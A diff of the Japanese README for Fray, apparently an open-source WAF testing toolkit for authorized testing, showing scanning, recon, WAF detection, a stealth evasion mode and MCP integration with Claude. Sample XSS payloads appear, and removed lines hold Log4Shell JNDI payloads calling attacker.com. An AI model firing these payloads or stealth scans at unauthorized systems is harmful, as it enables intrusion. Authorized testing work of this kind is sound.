@@ -1,6 +1,6 @@
 # Fray
 
-### ⚔️ *オープンソースWAFセキュリティテストツールキット — 情報収集、検出、テスト、レポート*
+### ⚔️ *オープンソースWAFセキュリティテストツールキット — スキャン、検出、テスト、レポート*
 
 [![Payloads](https://img.shields.io/badge/ペイロード-5500+-brightgreen.svg?style=for-the-badge)](https://github.com/dalisecurity/fray)
 [![WAF Detection](https://img.shields.io/badge/WAF検出-25社+-blue.svg?style=for-the-badge&logo=cloudflare)](https://github.com/dalisecurity/fray)
@@ -14,30 +14,20 @@
 
 **🌐 Language:** [English](README.md) | **日本語**
 
-> ⚠️ **正規の許可を得たセキュリティテスト専用** — 自身が所有する、または書面で明示的に許可を得たシステムのみテストしてください。
+> **正規の許可を得たセキュリティテスト専用** — 自身が所有する、または書面で明示的に許可を得たシステムのみテストしてください。
 
 ---
 
 ## なぜ Fray？
 
-多くのペイロード集は静的なテキストファイルに過ぎません。Frayなら**一気通貫のワークフロー**で完結します — 情報収集 → 検出 → テスト → レポート：
+多くのペイロード集は静的なテキストファイルに過ぎません。Frayは**一気通貫のワークフロー**です：
 
-- 🔍 **情報収集** — 14項目のチェック：TLS、ヘッダー、Cookie、DNS、CORS、公開ファイル、サブドメイン
-- 🎯 **スマートテスト** — WordPressを検出したら sqli + xss ペイロードを自動推奨。Y/Nで選択
-- 🛡️ **WAF検出** — 25社のベンダーをフィンガープリント（Cloudflare、AWS、Akamai、Imperva等）
-- 🐛 **HackerOne対応** — 構造化されたJSON出力がHackerOneの脆弱性分類にそのまま対応
-- 🤖 **AI対応** — Claude Code・ChatGPT連携用MCPサーバー搭載
-- 📊 **ワンコマンドレポート** — HTML・Markdownで脆弱性分析レポートを生成
-- ⚡ **依存関係ゼロ** — Python標準ライブラリのみで動作。`pip install fray` ですぐ使える
-
-| OWASPフレームワーク | ペイロード数 | カバレッジ |
-|-------------------|-----------|----------|
-| **Web Top 10:2021** | 1,690+ | ✅ 100% |
-| **Mobile Top 10:2024** | 575+ | ✅ 100% |
-| **LLM Top 10**（AI/ML） | 300+ | ✅ 100% |
-| **API Security Top 10** | 520+ | ✅ 100% |
-
-**対象ユーザー：** バグバウンティハンター · レッドチーム・ペンテスター · セキュリティ研究者 · WAF設定を検証するブルーチーム · セキュリティを学ぶ学生
+- **`fray scan`** — 自動クロール → パラメータ発見 → ペイロード注入（新機能）
+- **`fray recon`** — 14項目の自動チェック（TLS、ヘッダー、DNS、CORS、公開ファイル）
+- **`fray detect`** — 25社のWAFベンダーをフィンガープリント
+- **`fray test`** — 5,500以上のペイロード（22のOWASPカテゴリ）
+- **`fray report`** — HTML・Markdownレポート
+- **依存関係ゼロ** — Python標準ライブラリのみ。`pip install fray` ですぐ使える
 
 ---
 
@@ -48,30 +38,86 @@ pip install fray
 ```
 
 ```bash
-# 1. 情報収集 — テスト前にターゲットを把握
-fray recon https://example.com
-
-# 2. スマートモード — 情報収集 + 対話的にペイロードを選択
-fray test https://example.com --smart
-
-# 3. WAFベンダーの検出
-fray detect https://example.com
-
-# 4. 特定カテゴリでテスト
-fray test https://example.com -c xss --max 10
-
-# 5. CVEを調べる — ペイロード、深刻度、テスト方法
-fray explain CVE-2021-44228
-
-# 6. レポート生成
-fray report -i results.json -o report.html
+fray scan https://example.com                    # 自動スキャン（クロール + 注入）
+fray recon https://example.com                   # 情報収集
+fray test https://example.com --smart            # スマートペイロードテスト
+fray detect https://example.com                  # WAF検出
+fray explain CVE-2021-44228                      # CVEインテリジェンス
+fray report -i results.json -o report.html       # レポート生成
 ```
 
 ---
 
-## 🔍 情報収集 — `fray recon`
+## `fray scan` — 自動攻撃対象面マッピング
 
-14項目の自動チェックをワンコマンドで実行：
+ワンコマンドで：ターゲットをクロール、注入ポイントを発見、ペイロードをテスト、結果をレポート。
+
+```bash
+fray scan https://example.com -c xss -m 3 -w 4
+```
+
+```
+──────────────────── Crawling https://example.com ────────────────────
+  [  1] https://example.com
+  [  2] https://example.com/search
+  [  3] https://example.com/login
+  [  4] https://example.com/guestbook.php
+
+  ✓ Crawled 10 pages, found 7 injection points (3 forms, 1 JS endpoints)
+
+──────────────────────── Payload Injection ───────────────────────────
+  Testing 7 injection points × 3 xss payloads
+
+  [1/7] POST https://example.com/guestbook.php ?name= (form)
+      BLOCKED   403 │ <script>alert(1)</script>
+      PASSED    200 │ <img src=x onerror=alert(1)>               ↩ REFLECTED
+  [2/7] GET  https://example.com/search ?q= (form)
+      BLOCKED   403 │ <script>alert(1)</script>
+      PASSED    200 │ <img src=x onerror=alert(1)>               ↩ REFLECTED
+
+╭──────────── Scan Summary ────────────╮
+│ Duration          14s                │
+│ Total Tested      21                 │
+│ Blocked           15                 │
+│ Passed            6                  │
+│ Reflected         4                  │
+│ Block Rate        71.4%              │
+╰──────────────────────────────────────╯
+
+╭──────── ↩ Reflected (Confirmed Injection) ────────╮
+│  URL                  Param  Payload               │
+│  /guestbook.php       name   <img src=x onerror..  │
+│  /guestbook.php       text   <img src=x onerror..  │
+│  /search              q      <img src=x onerror..  │
+╰───────────────────────────────────────────────────╯
+```
+
+**処理の流れ：**
+1. **クロール** — BFS探索、同一オリジンリンクを追跡、`robots.txt` + `sitemap.xml`からシード
+2. **発見** — URL、HTMLフォーム、JavaScript APIコールからパラメータを抽出
+3. **注入** — 選択カテゴリのペイロードで各パラメータをテスト
+4. **反射検出** — レスポンス本文にペイロードがそのまま含まれるか確認
+5. **自動バックオフ** — 429レート制限を指数バックオフで処理
+
+```bash
+# スコープ制限付きスキャン（バグバウンティ向け）
+fray scan https://target.com --scope scope.txt -w 4
+
+# 認証付きスキャン + ステルスモード
+fray scan https://app.target.com --cookie "session=abc" --stealth
+
+# SQLiペイロードで深いスキャン
+fray scan https://target.com -c sqli --depth 5 --max-pages 100
+
+# CIパイプライン向けJSON出力
+fray scan https://target.com --json -o results.json
+```
+
+[全スキャンオプション + 使用例 →](docs/scanning-guide.md)
+
+---
+
+## `fray recon` — 14項目の自動チェック
 
 ```bash
 fray recon https://example.com
@@ -79,426 +125,191 @@ fray recon https://example.com
 
 | チェック項目 | 検出内容 |
 |------------|---------|
-| **TLS** | バージョン、暗号スイート、証明書の有効期限、TLS 1.0/1.1 |
-| **セキュリティヘッダー** | HSTS、CSP、X-Frame-Options + 他6項目（スコア付き） |
-| **Cookie** | HttpOnly、Secure、SameSiteフラグ（スコア付き） |
-| **フィンガープリント** | WordPress、Drupal、PHP、Node.js、React、nginx、Apache、Java、.NET等 |
-| **DNS** | A/AAAA/CNAME/MX/TXT/NSレコード、CDN検出、SPF/DMARC |
-| **robots.txt** | 制限パス、注目すべきエンドポイント（admin、api、login） |
-| **CORS** | ワイルドカードオリジン、反射型オリジン、認証情報の設定不備 |
-| **公開ファイル** | 28パスをプローブ — `.env`、`.git`、phpinfo、actuator、SQLダンプ |
-| **HTTPメソッド** | 危険なメソッド：PUT、DELETE、TRACE |
-| **エラーページ** | スタックトレース、バージョンリーク、フレームワーク情報の404分析 |
-| **サブドメイン** | crt.sh証明書透明性ログによる列挙 |
+| **TLS** | バージョン、暗号スイート、証明書有効期限 |
+| **セキュリティヘッダー** | HSTS、CSP、X-Frame-Options（スコア付き） |
+| **Cookie** | HttpOnly、Secure、SameSiteフラグ |
+| **フィンガープリント** | WordPress、PHP、Node.js、nginx、Apache、Java、.NET |
+| **DNS** | A/CNAME/MX/TXT、CDN検出、SPF/DMARC |
+| **CORS** | ワイルドカード、反射型オリジン、認証情報の設定不備 |
+| **公開ファイル** | `.env`、`.git`、phpinfo、actuator、SQLダンプ |
+| **サブドメイン** | crt.sh証明書透明性ログ |
 
-```bash
-fray recon https://example.com --json       # JSON出力
-fray recon https://example.com -o recon.json # ファイルに保存
-```
-
-> 📖 詳細は [docs/quickstart.md](docs/quickstart.md) を参照
+[情報収集ガイド →](docs/quickstart.md)
 
 ---
 
-## 🎯 スマートモード — `fray test --smart`
+## `fray test --smart` — 適応型ペイロード選択
 
 情報収集を先に実行し、検出結果に基づき最適なペイロードを提案：
 
+```bash
+fray test https://example.com --smart
 ```
-🔍 Running reconnaissance on https://example.com...
 
-───────────────────────────────────────────────────
-  Target:  https://example.com
-  TLS:     TLSv1.3
-  Headers: 67%
+```
   Stack:   wordpress (100%), nginx (70%)
-───────────────────────────────────────────────────
 
-  Recommended categories (based on detected stack):
-
-    1. sqli                      (1200 payloads)
-    2. xss                       (800 payloads)
-    3. path_traversal            (400 payloads)
-
-    Total: 2400 payloads (vs 5500 if all categories)
+  Recommended:
+    1. sqli            (1200 payloads)
+    2. xss             (800 payloads)
+    3. path_traversal  (400 payloads)
 
   [Y] Run recommended  [A] Run all  [N] Cancel  [1,3] Pick:
 ```
 
-| 入力 | 動作 |
-|-----|------|
-| **Y** | 推奨カテゴリを実行 |
-| **A** | 全カテゴリを実行 |
-| **N** | キャンセル |
-| **1,3** | 特定のカテゴリを選択 |
-
-```bash
-fray test https://example.com --smart -y    # 自動承認（CI/スクリプト用）
-```
-
-**検出技術 → ペイロードのマッピング：**
-
-| 検出技術 | 優先ペイロード |
-|---------|-------------|
-| WordPress | sqli, xss, path_traversal, command_injection, ssrf |
-| Drupal | sqli, ssti, xss, command_injection |
-| PHP | sqli, path_traversal, command_injection, file_upload |
-| Node.js | ssti, ssrf, xss, command_injection |
-| Java | ssti, xxe, sqli, command_injection |
-| .NET | sqli, path_traversal, xxe, command_injection |
-
-> 📖 OWASPカバレッジの詳細は [docs/owasp-complete-coverage.md](docs/owasp-complete-coverage.md) を参照
+[OWASPカバレッジ →](docs/owasp-complete-coverage.md)
 
 ---
 
-## 🛡️ WAF検出 — 25社対応
+## `fray detect` — 25社のWAF検出
 
 ```bash
 fray detect https://example.com
 ```
 
-対応ベンダー：**Cloudflare、AWS WAF、Akamai、Imperva、F5 BIG-IP、Fastly、Azure WAF、Google Cloud Armor、Sucuri、Fortinet、Wallarm、Vercel** 他13社
+Cloudflare、AWS WAF、Akamai、Imperva、F5 BIG-IP、Fastly、Azure WAF、Google Cloud Armor、Sucuri、Fortinet、Wallarm、Vercel 他13社
 
-[全ベンダー一覧 + 検出シグネチャ →](docs/waf-detection-guide.md) · [WAFリサーチ →](docs/waf-detection-research.md)
+[検出シグネチャ →](docs/waf-detection-guide.md)
 
 ---
 
-## � 認証付きスキャン
+## 主要機能
 
-本当の脆弱性はログイン後の画面に潜んでいます。Frayは全コマンドで認証付きスキャンに対応：
+### スコープ制限
+
+許可されたドメインのみにスキャンを制限 — バグバウンティに必須：
 
 ```bash
-# Cookie認証
-fray recon https://app.example.com --cookie "session=abc123; csrf=xyz"
-fray test https://app.example.com -c xss --cookie "session=abc123"
-
-# Bearerトークン（JWT、APIキー）
-fray test https://api.example.com -c sqli --bearer "eyJhbGciOiJIUzI1NiJ9..."
-
-# カスタムヘッダー（-Hで複数指定可）
-fray recon https://app.example.com -H "X-API-Key: secret" -H "X-Tenant: acme"
-
-# フォームログイン — 認証情報をPOST、セッションを自動取得してスキャン
-fray test https://app.example.com -c xss \
-  --login-flow "https://app.example.com/login,username=admin,password=secret"
-
-# 組み合わせ：ログイン + スコープ + スマートモード
-fray test https://app.example.com --smart --scope scope.txt \
-  --login-flow "https://app.example.com/login,email=user@test.com,password=pass123"
+# scope.txt
+example.com
+*.example.com
+192.168.1.0/24
 ```
-
-| フラグ | 対応コマンド | 説明 |
-|------|-----------|------|
-| `--cookie` | recon, detect, test | セッションCookie文字列 |
-| `--bearer` | recon, detect, test | Bearer/JWTトークン |
-| `-H` / `--header` | recon, detect, test | 任意のカスタムヘッダー（複数指定可） |
-| `--login-flow` | recon, detect, test | フォームログイン → セッションCookie自動取得 |
-
----
-
-## 🥷 レート制限 & ステルスモード
-
-実際のペンテストではレート制限で頻繁にブロックされます。Frayには回避機能を内蔵：
 
 ```bash
-# ランダムなジッター（0〜2秒）を基本遅延に追加
-fray test https://target.com -c xss --delay 1 --jitter 2
-
-# リクエスト/秒を制限（例：最大2 req/s）
-fray test https://target.com -c sqli --rate-limit 2
-
-# ステルスモード — 1つのフラグで完全回避：
-#   • User-Agentランダム化（Chrome/Firefox/Safari/Edge/モバイル）
-#   • Accept-Languageランダム化
-#   • 自動ジッター（1秒）+ スロットル（最大2 req/s）
-fray test https://target.com --smart --stealth
-
-# 全機能組み合わせ
-fray test https://target.com --stealth --scope scope.txt \
-  --cookie "session=abc" --delay 2 --jitter 3 --rate-limit 1
+fray scan https://target.com --scope scope.txt
+fray test https://target.com --smart --scope scope.txt
 ```
 
-| フラグ | デフォルト | 説明 |
-|------|---------|------|
-| `--delay` | 0.5秒 | リクエスト間の固定遅延 |
-| `--jitter` | 0 | 遅延に加算されるランダム変動（0〜N秒） |
-| `--rate-limit` | 0（無制限） | 1秒あたりの最大リクエスト数 |
-| `--stealth` | オフ | UA回転、ジッター（1秒）、スロットル（2 req/s）を有効化 |
+### 並行スキャン
 
-`--stealth`はデフォルト値を設定しますが、`--delay 5 --jitter 3`などの手動指定を優先します。
+`--workers`でクロールと注入を並列化：
+
+```bash
+fray scan https://target.com -w 4    # 約3倍高速
+```
+
+### ステルスモード
+
+1つのフラグで完全回避 — UA回転、ジッター、スロットル：
+
+```bash
+fray scan https://target.com --stealth
+```
+
+### 認証付きスキャン
+
+```bash
+fray scan https://app.example.com --cookie "session=abc123"
+fray scan https://api.example.com --bearer "eyJhbG..."
+```
+
+[認証ガイド →](docs/authentication-guide.md) · [スキャンガイド →](docs/scanning-guide.md)
 
 ---
 
-## ⚡ GitHub Actions — CI/CD連携
-
-PRごとにWAFテストを自動実行：
-
-```yaml
-# .github/workflows/waf-test.yml
-name: WAF Security Test
-on: [pull_request]
-permissions:
-  pull-requests: write
-
-jobs:
-  waf-test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: dalisecurity/fray@v1
-        with:
-          target: ${{ secrets.FRAY_TARGET_URL }}
-          mode: smart
-          fail-on-bypass: 'true'
-```
-
-### 全オプション
+## CI/CD — GitHub Actions
 
 ```yaml
 - uses: dalisecurity/fray@v1
   with:
-    target: 'https://staging.example.com'
-    mode: smart              # smart | all | xss | sqli | ssrf ...
-    max-payloads: '50'       # カテゴリ別最大ペイロード数
-    stealth: 'true'          # UA回転 + ジッター + スロットル
-    cookie: ${{ secrets.SESSION_COOKIE }}
-    bearer: ${{ secrets.API_TOKEN }}
-    scope-file: 'scope.txt'  # スコープ内のみテスト
-    fail-on-bypass: 'true'   # WAFバイパス時にCI失敗
-    comment-on-pr: 'true'    # PR結果テーブルをコメント
-    webhook: ${{ secrets.SLACK_WEBHOOK }}
+    target: ${{ secrets.FRAY_TARGET_URL }}
+    mode: smart
+    fail-on-bypass: 'true'
 ```
-
-### 動作内容
-
-1. **Frayインストール** — PyPIから自動取得
-2. **WAF検出** — ベンダー特定（Cloudflare、AWS WAF等）
-3. **ペイロードテスト** — スマートモードまたはカテゴリ指定
-4. **結果アップロード** — ビルドアーティファクトとして保存
-5. **PRコメント** — 結果テーブル（ブロック/バイパス/レート）を投稿
-6. **CI失敗** — WAFバイパス検出時に自動失敗（オプション）
-
-### CLIからワークフロー生成
 
 ```bash
-fray ci init                                       # .github/workflows/ にYAMLを生成
-fray ci init --target https://staging.example.com  # ターゲットURL指定
-fray ci show --minimal                             # 最小ワークフローを表示
+fray ci init    # ワークフローファイルを生成
 ```
+
+[CIガイド →](docs/quickstart.md)
 
 ---
 
-## 🐛 バグバウンティ連携
+## 5,500以上のペイロード · 22カテゴリ · 120件のCVE
 
-Frayはバグバウンティのワークフローに最適化されています — 情報収集からレポート提出まで：
-
-```bash
-# フルワークフロー：情報収集 → スマートテスト → レポート
-fray recon https://target.hackerone.com -o recon.json
-fray test https://target.hackerone.com --smart -y -o results.json
-fray report -i results.json -o report.html --format markdown
-```
-
-| プラットフォーム | Frayの活用方法 |
-|---------------|-------------|
-| **HackerOne** | 構造化された発見事項、Markdownレポート、脆弱性分類の整合 |
-| **Bugcrowd** | JSON出力が提出テンプレートに対応 |
-| **Intigriti** | 情報収集 → テスト → レポートのワークフロー |
-| **YesWeHack** | 情報収集スコアからの重大度マッピング |
-
-### スコープファイル対応
-
-バグバウンティハンターは常にスコープファイルを使います。Frayはそのまま読み込めます：
+| カテゴリ | 件数 | カテゴリ | 件数 |
+|---------|-----|---------|-----|
+| XSS | 867 | SSRF | 167 |
+| SQLi | 456 | SSTI | 98 |
+| コマンドインジェクション | 234 | XXE | 123 |
+| パストラバーサル | 189 | AI/LLMプロンプトインジェクション | 370 |
 
 ```bash
-# scope.txt（Burp形式）
-example.com
-*.example.com
-10.0.0.0/24
-https://app.example.com/api
-- staging.example.com    # 除外
-! internal.example.com   # 除外
+fray explain log4shell    # CVEインテリジェンス（ペイロード付き）
+fray payloads             # 全カテゴリを一覧表示
 ```
 
-```bash
-# スコープファイルを確認
-fray scope scope.txt
-
-# ターゲットがスコープ内かチェック
-fray scope scope.txt --check https://sub.example.com
-
-# スコープ強制付きテスト — 範囲外のターゲットをブロック
-fray test https://target.com --smart --scope scope.txt
-```
-
-対応形式: **ドメイン、ワイルドカード（\*.example.com）、IP、CIDR、URL、スコープ外除外**
-
-### ワークフロー例
-
-```
-1. fray scope scope.txt                           → スコープを確認
-2. fray recon https://target.com                  → 攻撃対象面を調査
-3. fray detect https://target.com                 → WAFの種類を特定
-4. fray test https://target.com --smart --scope scope.txt  → スコープ強制付きテスト
-5. fray report -i results.json                    → 提出用レポートを生成
-```
+[ペイロードデータベース →](docs/payload-database-coverage.md) · [CVEカバレッジ →](docs/cve-real-world-bypasses.md)
 
 ---
 
-## 🤖 MCPサーバー — AI連携
+## MCPサーバー — AI連携
 
 ```bash
 pip install fray[mcp]
 fray mcp
 ```
 
-Claude Desktop設定（`~/Library/Application Support/Claude/claude_desktop_config.json`）に追加：
-
-```json
-{
-  "mcpServers": {
-    "fray": { "command": "python", "args": ["-m", "fray.mcp_server"] }
-  }
-}
-```
-
-**6つのツール：** `list_payload_categories`、`get_payloads`、`search_payloads`、`get_waf_signatures`、`get_cve_details`、`suggest_payloads_for_waf`
-
-Claudeに質問：*「CloudflareをバイパスするXSSペイロードは？」* → MCPツールが直接呼び出されます。
-
-### 例：CVE検索
-
-```
-You:    「FrayはReact2Shellをカバーしてる？」
-Claude:  → get_cve_details("react2shell") を呼び出し
-         → 「はい — xss/cve_2025_real_world.json に5件のペイロード
-            React Server Components RCE（CVSS 10.0、CISA KEV）を含む」
-
-You:    「Log4Shellのペイロードを見せて」
-Claude:  → search_payloads("log4shell") を呼び出し
-         → JNDIインジェクションのバリエーション15件を返却
-
-You:    「AWS WAFに効くペイロードは？」
-Claude:  → suggest_payloads_for_waf("aws") を呼び出し
-         → AWS WAF向けの優先バイパスペイロードを返却
-```
+Claudeに質問：*「CloudflareをバイパスするXSSペイロードは？」* → FrayのMCPツールが直接呼び出されます。
 
 [Claude Codeガイド →](docs/claude-code-guide.md) · [ChatGPTガイド →](docs/chatgpt-guide.md)
 
 ---
 
-## 📊 レポート
-
-```bash
-fray report --sample                           # デモレポート
-fray report -i results.json -o report.html     # HTMLレポート
-fray report -i results.json --format markdown  # Markdownレポート
-```
-
-![Fray サンプルレポート](docs/sample-report.png)
-
-[レポートガイド →](docs/report-guide.md) · [POCシミュレーションガイド →](docs/poc-simulation-guide.md)
-
----
-
-## 📦 5,500以上のペイロード
-
-```bash
-fray payloads  # 全カテゴリを一覧表示
-```
-
-| カテゴリ | ペイロード数 | カテゴリ | ペイロード数 |
-|---------|-----------|---------|-----------|
-| XSS | 867 | SSRF | 167 |
-| SQLi | 456 | SSTI | 98 |
-| コマンドインジェクション | 234 | XXE | 123 |
-| パストラバーサル | 189 | ファイルアップロード | 70+ |
-| AI/LLMプロンプトインジェクション | 370 | Webシェル | 160+ |
-| OWASPモバイル | 575+ | CVEエクスプロイト | 220 |
-
-**120件の実際のCVE**（2020–2026年）を含む：Log4Shell、Spring4Shell、ProxyShell、React2Shell等。
-
-### `fray explain` — CVEインテリジェンス
-
-```bash
-fray explain CVE-2021-44228        # CVE IDで検索
-fray explain log4shell              # 名前で検索
-fray explain react2shell --max 10   # 表示数を増やす
-fray explain spring4shell --json    # JSON出力
-```
-
-```
-Fray Explain — CVE Intelligence
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  CVE-2021-44228
-  Log4Shell - Log4j RCE
-
-  Severity:     CRITICAL（CVSS 10.0）
-  Affected:     Log4j 2.0-beta9 〜 2.14.1
-  Disclosed:    2021-12-09
-  Payloads:     2件
-
-  #1 ${jndi:ldap://attacker.com/exploit}
-  #2 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
-
-  テスト方法:
-    → コマンド実行エンドポイントを確認、入力サニタイズを検証
-    → fray test <url> -c xss --max 10
-```
-
-[全ペイロードデータベース →](docs/payload-database-coverage.md) · [CVEカバレッジ →](docs/cve-real-world-bypasses.md) · [AIセキュリティ →](docs/ai-security-guide.md) · [モバイルセキュリティ →](docs/owasp-mobile-top10.md) · [APIセキュリティ →](docs/owasp-api-security.md)
-
----
-
-## 🏗️ プロジェクト構成
+## プロジェクト構成
 
 ```
 fray/
 ├── fray/
 │   ├── cli.py              # CLIエントリーポイント
-│   ├── recon.py             # 14項目の情報収集エンジン
+│   ├── scanner.py           # 自動スキャン：クロール → 注入
+│   ├── recon.py             # 14項目の情報収集
 │   ├── detector.py          # WAF検出（25社対応）
 │   ├── tester.py            # ペイロードテストエンジン
-│   ├── evolve.py            # 適応型ペイロード進化
 │   ├── reporter.py          # HTML + Markdownレポート
 │   ├── mcp_server.py        # AI連携用MCPサーバー
 │   └── payloads/            # 5,500以上のペイロード（22カテゴリ）
-├── tests/                   # 330テスト
-├── docs/                    # 28ガイド
+├── tests/                   # 624テスト
+├── docs/                    # 30ガイド
 └── pyproject.toml           # pip install fray
 ```
 
 ---
 
-## 📈 ロードマップ
+## ロードマップ
 
-**完了：**
-- [x] 14項目の情報収集機能（`fray recon`）
-- [x] 対話型プロンプトによるスマートペイロード選択（`--smart`）
-- [x] Cookie、CORS、公開ファイル、DNS、サブドメインスキャン
-- [x] 適応型ペイロード進化
-- [x] HTML + Markdownレポート生成
-- [x] AI連携用MCPサーバー
-
-**次のステップ：**
-- [ ] 共有可能なレポートURL（一時ホスティングHTML）
+- [x] 自動スキャン：クロール → 発見 → 注入（`fray scan`）
+- [x] 反射型ペイロード検出（注入確認）
+- [x] スコープファイル制限 + 並行ワーカー
+- [x] 14項目の情報収集、スマートモード、WAF検出
+- [x] HTML/Markdownレポート、MCPサーバー
 - [ ] HackerOne API連携（自動送信）
 - [ ] Webベースのレポートダッシュボード
 - [ ] MLベースのペイロード有効性スコアリング
-- [ ] マルチWAF比較テスト
 
 ---
 
 ## コントリビュート
 
-[CONTRIBUTING.md](CONTRIBUTING.md) を参照。ペイロードの追加、ツール改善、ドキュメントのPRを歓迎します。
+[CONTRIBUTING.md](CONTRIBUTING.md) を参照。
 
 ## 法的事項
 
-**MITライセンス** — [LICENSE](LICENSE) を参照。所有または明示的な許可を得たシステムのみテストしてください。本ツールの悪用について著者は一切の責任を負いません。
+**MITライセンス** — [LICENSE](LICENSE) を参照。所有または明示的な許可を得たシステムのみテストしてください。
 
 **セキュリティ問題：** soc@dalisec.io · [SECURITY.md](SECURITY.md)
 
 ---
 
-**[📖 全ドキュメント（28ガイド）](docs/) · [PyPI](https://pypi.org/project/fray/) · [Issues](https://github.com/dalisecurity/fray/issues) · [Discussions](https://github.com/dalisecurity/fray/discussions)**
+**[📖 全ドキュメント（30ガイド）](docs/) · [PyPI](https://pypi.org/project/fray/) · [Issues](https://github.com/dalisecurity/fray/issues) · [Discussions](https://github.com/dalisecurity/fray/discussions)**
